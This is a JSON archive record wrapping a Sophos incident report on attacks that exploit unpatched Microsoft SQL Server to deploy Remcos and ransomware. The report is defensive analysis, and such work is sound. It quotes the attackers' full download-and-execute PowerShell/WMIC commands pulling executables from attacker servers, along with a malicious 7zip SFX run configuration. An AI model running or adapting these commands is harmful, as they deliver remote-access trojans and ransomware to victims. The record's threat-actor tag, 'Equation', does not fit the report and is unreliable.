{
    "id": "ab731493-0ae1-43f7-94c2-8c44bc04b8e2",
    "created_at": "2023-06-05T02:07:01.517508Z",
    "updated_at": "2025-03-27T02:08:00.129578Z",
    "deleted_at": null,
    "sha1_hash": "7888231630d4f74bbf1e0f958d702ea2e41f5d54",
    "title": "2022-07-20 - OODA- X-Ops Takes On Burgeoning SQL Server Attacks",
    "authors": "",
    "file_creation_date": "2023-06-04T13:51:38Z",
    "file_modification_date": "2023-06-04T13:51:38Z",
    "file_size": 2150027,
    "plain_text": "# OODA: X-Ops Takes On Burgeoning SQL Server Attacks\n\n**[news.sophos.com/en-us/2022/07/20/ooda-x-ops-takes-on-burgeoning-sql-server-attacks/](https://news.sophos.com/en-us/2022/07/20/ooda-x-ops-takes-on-burgeoning-sql-server-attacks/)**\n\nJuly 20, 2022\n\nOur X-Ops teams – SophosLabs, SecOps (Sophos Managed Threat Response [MTR] and\nSophos Rapid Response), and Sophos AI – operate in a virtuous Observe-Orient-Decide-Act\nloop, building on each teams’ work to improve customer protections. A recent set of\ninvestigations illustrates our OODA-loop process: Attacks against a pair of vulnerabilities in\nMicrosoft SQL were researched, documented, and addressed proactively. And, when one\nenterprise found itself under a potentially similar attack, the teams worked together to\npinpoint the common denominator, minimize damage, and protect the customer… and\ncustomers to come.\n\nAt the beginning of 2022, SophosLabs and Sophos MTR had been investigating an uptick in\nreports of attacks against Microsoft SQL Server installations, using two venerable and longpatched remote code execution vulnerabilities (CVE-2019-1068, CVE-2020-0618). These\nattacks leverage Remcos (a commercially available remote access trojan) and deploy\nvarious families of ransomware including TargetCompany, aka Mallox; GlobeImposter, aka\nAlpha865qqz; and BlueSky.\n\nIn this report, we walk through the ways in which our teams coordinated to address this\nthreat, focusing on hands-on work from Sophos Managed Threat Response (MTR) and\nSophos Rapid Response. These front-line efforts have been made possible by the steady\n\n\n-----\n\nresearch work of SophosLabs and, further behind the scenes, the elective-automation aspect\nof that process made possible by the humans at Sophos AI.\n\nOn our GitHub, we’ll provide details of the threat actor’s observed infrastructure and on\nvarious indicators of compromise (IoCs). In the case of information derived from the Rapid\nResponse engagement we discuss below, that information has already been incorporated\ninto our MTR service and Intercept X suite, but we’ll highlight some items in this writeup as a\nmatter of interest. For practitioners who might benefit from a labs-notes-style iteration of the\ninformation we’re discussing, we’ll make that available later in our incident guide series.\n\n**Identification**\n\nThe methods of ingress, malware used, and command-and-control servers accessed in the\nprocess of this Microsoft SQL attack indicate that the same threat group is likely responsible\nfor multiple incidents in the first half of 2022. Sophos has observed victims in the Americas;\nhowever, most of the victims are from Asia and the comments in some components indicate\nthat the threat actor could be originating from that region. We have previously observed this\nthreat group targeting externally exposed and unpatched SQL servers.\n\n**Initial access**\n\nDuring MTR’s initial investigations into this threat group, we saw them leveraging malware\ninfrastructure impersonating a download site for KMSAuto, a non-malicious software utility\nused for evading Windows license key activations.\n\n_Figure 1: An overview of the attack_\n\nMeanwhile, over in the world of Rapid Response, a direct view of the initial stages of an\nattack is usually only seen in retrospect. In this case, the victim first noticed that something\nwas wrong: a full-on ransomware attack against an unprotected SQL server. Acting on their\n\n\n-----\n\nown, the enterprise chose to wipe and restore their systems from backup, this time installing\nIntercept X. However, the server in question was lacking crucial patches, so the door\nremained open to the attackers.\n\nThis oversight did not go unnoticed. A week later, the customer’s service provider warned\nthem that their servers were implicated in an ongoing denial-of-service attack against an\nunrelated third party. The customer, by this point running Intercept X on the previously\nunprotected server, hadn’t noticed any further ransomware activity… but what was\nhappening?\n\n**Infection Chain and SQL Exploitation**\n\nDuring MTR’s investigation, the team did not observe this group attempting to perform\ninternal lateral movement. Instead, the same post-exploit command was leveraged multiple\ntimes to download and run different executable files before ultimately delivering ransomware:\n\n“C:\\Windows\\system32\\cmd.exe” /c “echo $client = New-Object\n\nSystem.Net.WebClient > %TEMP%\\update.ps1 & echo\n\n$client.DownloadFile(“http://C2_Server_IP/\nmalware.exe”,”%TEMP%\\<random>.exe”) >> %TEMP%\\update.ps1 & powershell –\n\nExecutionPolicy Bypass %temp%\\update.ps1 & WMIC process call create\n\n“%TEMP%\\<random>.exe””\n\nThe trigger for MTR’s investigation was a CryptoGuard alert on a specific file,\n9YFHR4SL.exe:\n\nPath:\nC:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\9YFHR4SL.exe\n\nHash:      7d0687911ea9423310b7b83ebec9f52944ac022795c3b796aca5f0d2d15954b1\n\nAnalysis shows that this file in turn downloads\nhttp://91[.]243[.]44[.]105/Lvmsrqz_Phdvabki.jpg, which turns out to be the encrypted\nGlobeImposter/Alpha865qqz payload. The main steps are visualized in Figure 2, below:\n\n1. A batch command creates C:\\Users\\MSSQL$~1\\AppData\\Local\\Temp\\update.ps1\n2. PowerShell executes update.ps1\n3. ps1 downloads m0qw5dj1.exe\n4. exe is executed\n5. Services are stopped\n6. Processes are killed\n\n\n-----\n\n_Figure 2: The main steps in the attack_\n\nThe full paths of the components show they were executed from the SQL Server temporary\ndirectory, like so:\n\nC:\\Users\\MSSQL$~1\\AppData\\Local\\Temp\\update.ps1\n\nC:\\Windows\\SERVIC~1\\MSSQL$~1\\AppData\\Local\\Temp\\update.ps1\n\nC:\\Windows\\ServiceProfiles\\MSSQLSERVER\\AppData\\Local\\Temp\\JBEDW0VJ.exe\n\nThis shows that the initial access was via SQL Server. Next, the following command is\nexecuted in the first line shown above:\n\n“echo $client = New-Object System.Net.WebClient > %TEMP%\\update.ps1 & echo\n$client.DownloadFile(“http[:]//91[.]243[.]44[.]105/Lhtot.exe”,”%TEMP%\\M0QW5DJ1.exe”) >>\n%TEMP%\\update.ps1 & powershell -ExecutionPolicy Bypass %temp%\\update.ps1 & WMIC\nprocess call create “%TEMP%\\M0QW5DJ1.exe””\n\n\n-----\n\nMeanwhile, in Rapid Response s world, a call was about to come in from the customer.\nIntercept X was still holding off attack escalation there, but the situation was potentially\nvolatile – after all, protections are like the shields on the Enterprise; they block surprise\nattacks, and they give the humans time to mount a proper defense, but no shield can hold\nout forever. And the customer’s internal investigation had reached a dead end as to what\nwas the matter. With no visibility into what was happening, the customer knew it was time to\nescalate.\n\n**Identified components**\n\nDuring their investigation, MTR saw that this threat group leveraged a few different\ncomponents in their recent attacks against SQL servers – some legitimate wares being\nabused, some malicious by nature. These include:\n\nPowerShell downloader\ndotNet downloader\nTargetCompany / Mallox ransomware\nGlobeImposter / Alpha865qqz ransomware\nKill$ cleaner\n7zip SFX installer (AutoIt loader)\nRemcos remote access Trojan\n\nIn the following sections we’ll step through the role each plays in this attack. (As a reminder,\nthe presence or use of a specific tool in any attack does not mean the tool itself is malicious;\ntools such as PowerShell and 7zip are legitimate applications abused in this specific\nsituation.) We’ll also look at an eighth component MTR discovered in a few infections, and\ndiscuss what Rapid Response ultimately saw and did to recover the customer, facing a\ndetermined attacker rattling around in their network.\n\n**PowerShell downloader**\n\nMTR’s investigation found very simple scripts that reach out to the download server,\ndownload the next-stage component, and execute it:\n\n$client = New-Object System.Net.WebClient\n\n$client.DownloadFile(“http://91[.]243[.]44[.]142/arxIkrbwika.exe”,”C:\\Users\\MSSQL$~1\\AppData\\Local\\Temp\\VKDA55H6.exe”)\n\nThe downloaded PE executable is usually the dotNet downloader, which in turn downloads\nthe final payload. This varies — either one of the ransomware samples or a Remcos RAT\nvariant.\n\n**dotNet downloader**\n\n\n-----\n\nNext, PowerShell is leveraged again to run a .NET executable file that functions as a\ndownloader for additional attack components. We will walk through the five highlighted steps\nin the diagram below.\n\n_Figure 3: A snippet of more attack components entering the fray_\n\nIn Figure 3, the sqlservr.exe process (1) runs the command line (2) that creates the\ndownloader:\n\n“C:\\WINDOWS\\system32\\cmd.exe” /c “echo $client = New-Object\n\nSystem.Net.WebClient > %TEMP%\\update.ps1 & echo\n\n$client.DownloadFile(“http://91[.]243[.]44[.]142/pl\nUkxamliyg.exe”,”%TEMP%\\9ETVCRZF.exe”) >> %TEMP%\\update.ps1 & powershell –\n\nExecutionPolicy Bypass %temp%\\update.ps1 & WMIC process call create\n\n“%TEMP%\\9ETVCRZF.exe””\n\nNext, update.ps1 (3) downloads the dotNet downloader and executes it (4), and the\ndownloader fetches the final payload (5).\n\n\n-----\n\n_Figure 4: The payload is acquired; note the .jpg extension for the file before it’s decoded_\n\nThe final payload is in obfuscated or encrypted form, so the dotNet downloader has to\ndecode it first. The encryption can be as simple as reversing the content of the file, or in a\ntypical case a XOR encryption with a hardcoded key:\n\n_Figure 5: Decrypting the payload_\n\n**TargetCompany Ransomware (aka Mallox)**\n\nIn March 2022 the MTR team investigated a case in which an externally exposed and\nunpatched SQL server was compromised. Sophos CryptoGuard detected a ransomware\nattack and prevented encryption of essential files, such as the SQL database files. During\nthe incident MTR observed the threat actor leveraging the command-and-control servers\n91[.]243[.]44[.]42 and 91[.]243[.]44[.]142.\n\n\n-----\n\nThe server at 91[.]243[.]44[.]142 had the file content shown in Figure 6, which matches that\nseen on other servers examined:\n\n_Figure 6: A directory listing from the malicious server 91[.]243[.]44[.]142; Kill$ is visible near_\n_the top of the list_\n\nThe observed filepath was:\n\nC:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\C258SEE8.exe\n\nAnd the observed hash was:\n\n8bb03cb1d5faf00b93612a10f24fb3afe025f59c0226a4b20b1a61fe06cd2077\n\nA process trace revealed the following:\n\n1 C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\C258SEE8.exe [14500]\n\n2 C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\C258SEE8.exe [13716]\n\nC:\\WINDOWS\\SERVIC~1\\NETWOR~1\\AppData\\Local\\Temp\\C258SEE8.exe\n\n3 C:\\Windows\\System32\\wbem\\WmiPrvSE.exe [12708]\n\nC:\\WINDOWS\\system32\\wbem\\wmiprvse.exe -secured -Embedding\n\n4 C:\\Windows\\System32\\svchost.exe [736]\n\nC:\\WINDOWS\\system32\\svchost.exe -k DcomLaunch -p\n\n5 C:\\Windows\\System32\\services.exe [984]\n\n6 C:\\Windows\\System32\\wininit.exe [856]\n\nAt this point, wininit.exe appended the file extension .avast. In early February 2022, the\nantimalware firm Avast [published a technique to decrypt files affected by the TargetCompany](https://decoded.avast.io/threatresearch/decrypted-targetcompany-ransomware/)\nransomware. Following the publication of that research, TargetCompany modified the\n\n\n-----\n\nransomware file extension from .mallox to .avast. (They also fixed certain bugs present in\nthe encryption algorithm.). We have notified Avast about this.\n\nFinally, MTR observed the following contact information and ransom note related to the\nTargetCompany / Mallox infection:\n\n_Figure 7: The ransomware payload’s contact information and ransom note_\n\nTwo addresses are associated with this ransom note: mallox@tutanota.com and\nrecohelper@cock.li .\n\n**GlobeImposter Ransomware (aka Alpha865qqz)**\n\nThis ransomware variant creates a file called “how to back your files.exe,” which contains the\nransom note shown in Figure 8. On execution it displays:\n\n_Figure 8: The GlobeImposter ransomware note_\n\nThe ransomware then adds the file extension .Globeimposter-Alpha865qqz.\n\n\n-----\n\nOne contact address, China.Helper@aol.com, is associated with this ransom note. We will\nsee this address again later in our walkthrough.\n\n**Kill$ cleaner**\n\nThis component drops and executes a batch file into %TEMP%. This batch file stops\nservices and processes. It shows a series of console windows displaying the progress it is\nmaking, as shown in Figure 9:\n\n_Figure 9: Kill$ getting busy on a victim’s services and processes_\n\nkill$.exe drops a batch file into %TEMP%. Interestingly, this file contains comment strings in\nChinese:\n\n_Figure 10: Multilingual comments hint at a possible threat source_\n\nThe Chinese strings we saw can be translated as follows:\n\n“Restore cmd default association”\n\n\n-----\n\n::NET permission settings\n“:mshta permission settings “\n“::FTP permission settings”\n“::wscript permission settings”\n“::cscript permission settings”\n“::powershell permission settings”\n“::ProgramData folder permission settings”\n“::Public folder permission settings”\n\n**7zip SFX installers**\n\nSome of the payload files are 7zip SFX executables. At first these appear to have only a\nsingle junk file, forma.xla, inside as shown in Figure 12:\n\n_Figure 11: A lonely junk file in the 7zip SFX executable… or is it?!_\n\nIn reality, multiple files are present, as shown in the temporary directory created by the\ndropper:\n\n_Figure 12: It was not a lonely junk file_\n\nThese installers abuse the 7zip SFX file structure. Normally an SFX file contains three\ncomponents:\n\n_sfx : the SFX stub program_\n_txt: the configuration file, including the auto-execute script_\n_7z: the content of the archive to extract_\n\nThese components can be observed if the archive is opened in parse mode, using the\ncommand 7-Zip / Open Archive / # to return the results in Figure 13:\n\n\n-----\n\n_Figure 13: Parsing the unclean SFX file_\n\nHere we see the stub (1) and the config file (2), but instead of the archive content, there are\ntwo additional files. (3) is a short ZIP package that contains Forma.xla, the fake / junk\ncontent we saw in Figure 11, and (4) is the real installer 7zip archive, with this content:\n\n_Figure 14: Contents of the archive shown in the previous figure_\n\nThe real installer (4.7z in this case) is usually in the overlay area, following the installer\nscript, but in some samples it is within the SFX stub program as one of the resources.\n\nThe installer config file is as follows:\n\n;!@Install@!UTF-8!\n\nGUIMode=”2″\n\nOverwriteMode=”1″\n\nSetEnvironment=”Venuto=d”\n\nRunProgram=”dllhost.exe”\n\nRunProgram=”cm%Venuto% /c cm%Venuto% < Qui.xla”\n\n;!@InstallEnd@!\n\nThis will run the content of the Qui.xla command script. This kind of installer script has been\n[described in a white paper from Red Canary. It appears the criminals are ripping off the idea](https://redcanary.com/wp-content/uploads/2021/12/KMSPico-V5.pdf)\n[from earlier attacks, including the CypherIT obfuscation from several years ago.](https://www.technadu.com/malicious-actors-extensively-using-cypherit-package-malware/87460/)\n\nThe script contains a slightly (intentionally) corrupted AutoIt loader (Impazienzia.xla), an\nAutoIt script (Potare.xla), and a batch command file (Qui.xla), as shown in Figure 14.\nArrFQX.dll is a legitimate Microsoft system component, ntdll.dll .\n\nQui.xla restores the AutoIt loader (removes the junk string from the beginning and places the\nMZ marker there), copies to Riverdela.exe.pif (not present in the SFX archive), and runs the\nAutoIt script with the loader.\n\n\n-----\n\n_Figure 15: Qui.xla in action_\n\nThe payload is either Remcos or ransomware.\n\n**Remcos**\n\nHere, update.ps1 is executed from the SQL server temp directory (1). It reaches out to the\ndownload server 91[.]243[.]44[.]105 (2), and downloads and executes the Remcos payload\n(3).\n\n\n-----\n\n_Figure 16: The malicious update.ps1 file in action_\n\nAgain, the payload is Remcos.\n\n_Figure 17: Traces of Remcos_\n\nRemcos configuration data includes the following value written to the registry under\nHKEY_CURRENT_USER\\Software\\Remcos-{generated_ID}\\license:\n\n\n-----\n\n572275BEEA6ECA3A6089848060C1A26D\n\n**GlobeImposter… Has an Imposter**\n\nSince Sophos’ data intake is extremely broad, we occasionally find unusual results that give\na fuller picture of an attack as it and its payloads evolve. Our MTR team identified one such\ninstance of a particular item of ransomware, a GlobeImposter lookalike, in telemetry.\n\nIn this case, the downloaded payload was one of the 7zip installers.\n\n_Figure 18: The observed execution flow that installed the GlobeImposter lookalike_\n\nIn Figure 18 we can see the execution flow for this lookalike:\n\n1. ps1 is executed\n2. Downloads and executes\n\nc:\\windows\\serviceprofiles\\networkservice\\appdata\\local\\temp\\a0hnp5kn.exe\n3. The installer batch file is executed from the 7zip SFX:\n\n“C:\\Windows\\System32\\cmd.exe” /c cmd < Chiamando.png\n4. The AutoIt interpreter\n\nc:\\windows\\serviceprofiles\\networkservice\\appdata\\local\\temp\\7zipsfx.000\\doni.exe.pif\nis invoked to execute the extracted script\n5. Services are stopped\n6. Processes are killed\n7. The ransom note executable, q:\\factoryrecovery\\how to back your files.exe is created\n\n\n-----\n\nThe downloaded payload has the hash\n\n5d0e4ef9ee1f3a319faa45c572b5e7097865ddbda3840d138ae65a7d829cfddf\n\nThis file was hosted on two servers:\n\nhttp://91[.]243[.]44[.]42/G-865-nMSamgr.exe\n\nhttp://91[.]243[.]44[.]30/G-865-nMSamgr.exe\n\nIts process begins by killing an assortment of services, as seen in Figure 19:\n\n_Figure 19: So much killing_\n\nIt then creates the ransom note shown in Figure 20. Note the use of the\nChina.Helper@aol.com address, which we also saw in the instance of the “real”\nGlobeImposter infection discussed above.\n\n\n-----\n\n_Figure 20: The ransom note, which strongly resembles the GlobeImposter ransom note_\n_shown in Figure 8 above_\n\nBack at Rapid Response, investigators worked their case, reviewing indicators of\ncompromise as well as network traces specific to the client. The team found evidence that\nattackers had discovered the still-unpatched servers and by that means managed to reaccess the system, but this time Intercept X was in place — swatting back the same\ndistinctive multiple-download attempts MTR had previously identified, over and over. The\nattacker could not, and never did, succeed in lateral movement within the client’s network.\nThe client would never experience data exfiltration or a ransom demand on our watch.\n\n\n-----\n\nRapid Response did spot a previously unnoted indicator of compromise, the anti-antimalware\ntool called IOBit Unlocker. This tool aims to disable antivirus and antimalware protections\nsuch as Intercept X. However, Intercept X won that head-to-head battle, flagging IOBit\nUnlocker as a potentially unwanted application and removing it from the client’s system\nbefore it could execute.\n\nThe Rapid Response team continued to move ahead, noting that as MTR had previously\nseen, the attacker made no visible attempts to move laterally, escalate privilege, or exfiltrate\ndata; most of their efforts during our engagement were, as noted above, centered on trying\nto take Intercept X out of the equation. While Intercept X held the line on all that, Response’s\nresearchers uncovered a welter of further correlations between the activity logged on the\ncustomer’s system and information MTR had already compiled. The smoking gun? Ongoing\ntraffic between the customer’s SQL server and the known-bad fake KMSAuto distribution site\n– a tell knowing what we now know, but all but impossible to spot in the denial-of-service\nmayhem without prior knowledge of a threat that fit the rest of the attacker’s behaviors.\n\nWith analysis completed and the cause of the trouble identified, Rapid Response could\ncontinue its portion of the customer-protection process. The attacker was known to utilize the\ntwo specific MS-SQL vulnerabilities named above; identifying those as unpatched on the\ncustomer system was crucial. The team’s final report on the incident ran to 35 pages. The\nheart of that was a four-page section detailing mitigations specified to protect and strengthen\nthe customer and to eliminate the attacker’s foothold at last. Rapid Response made an\nintroduction between the customer and the MTR team to continue the process of getting\nback to normal, and another Response event was in the books.\n\n**Conclusion**\n\nCompromises involving multiple payloads and obfuscating behaviors are regular fare for\ndefenders to tackle. However, we believe that obfuscation should never come from internal\nsilos, or from lack of communication between teams operating under the same corporate\numbrella. We are Sophos; while the X-Ops name may be new, as you see from this glimpse\ninto the organization, the process of acting as one team is nothing new here.\n\n[For more information on Sophos X-Ops, please see our FAQ.](https://news.sophos.com/sophos-x-ops-faq)\n\n**Acknowledgements**\n\nThe authors would like to thank Richard Cohen of SophosLabs and Robert Weiland,\nHarinder Bhathal, Syed Zaidi, Mahmoud Alsharqawi, Sergio Bestulic and Peter Mackenzie of\nthe Rapid Response team for their contributions to this report.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-07-20 - OODA- X-Ops Takes On Burgeoning SQL Server Attacks.pdf"
    ],
    "report_names": [
        "2022-07-20 - OODA- X-Ops Takes On Burgeoning SQL Server Attacks.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1685930821,
    "ts_updated_at": 1743041280,
    "ts_creation_date": 1685886698,
    "ts_modification_date": 1685886698,
    "files": {
        "pdf": "https://archive.orkl.eu/7888231630d4f74bbf1e0f958d702ea2e41f5d54.pdf",
        "text": "https://archive.orkl.eu/7888231630d4f74bbf1e0f958d702ea2e41f5d54.txt",
        "img": "https://archive.orkl.eu/7888231630d4f74bbf1e0f958d702ea2e41f5d54.jpg"
    }
}